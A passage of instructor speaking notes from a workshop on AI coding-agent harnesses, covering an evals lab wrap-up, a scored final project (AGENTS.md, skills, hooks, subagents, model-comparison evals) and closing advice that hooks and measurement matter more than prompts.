THEN: "`python scripts/tasks.py evals --only fix_rounding` to try one; then `--repeat 3`; and if you have two models, compare them."

LAB WRAP-UP (10 min): project your results. Bring back yesterday's milestone table: "Does what you thought yesterday match the numbers? Does the model that "did better" still win with three repetitions?" There are almost always surprises: discuss them.

SAY: "Moral: without measuring, it's all opinion."


## 49. Your Forja, for the way you work  `#final`

[16:00 · 60 min: 45 of work + 3-min demos.]

SAY: "Final project: your Forja, for the way you work. The rubric is on the slide and in the workbook."
▸ "A useful AGENTS.md for a real repository of yours: 1 point."
▸ "A skill for your team —conventions, deployment, review—: 2 points."
▸ "A hook that guarantees something you ask for nicely today —tests, linter, secrets—: 2 points."
▸ "A specialized subagent: 2 points."
▸ "An eval task that represents your daily work, with results from two models: 3 points. It's worth the most because it's what turns opinions into decisions."

SAY: "At 16:45, three-minute demos: what you did and one number."

DURING THE DEMOS: prioritize the ones that bring eval data; ask each person "what would you change in your team tomorrow with this?"


## 50. Models change. The harness is yours.  `#cierre`

[17:00 · 5 min]

SAY: "I'll leave you with three ideas."
▸ "An agent is model plus tools plus loop. Everything else —control, context, extension— is harness, and the harness is yours."
▸ "What matters is guaranteed with permissions and hooks, not prompts. A prompt asks; a hook enforces."
▸ "Measure. A new model, a prompt change or a skill: with evals you know whether it's better."

SAY: "Models will keep changing every few months. What you've built these two days works with the next one."

CHALLENGE: "Two-week challenge: use your Forja on a real repository with an AGENTS.md, a skill and a hook, and bring me the evals report. I'll write to you to see how it's going."

SAY: "Thank you. The survey is at [link]; it helps me a lot. And the repository is yours: keep building."
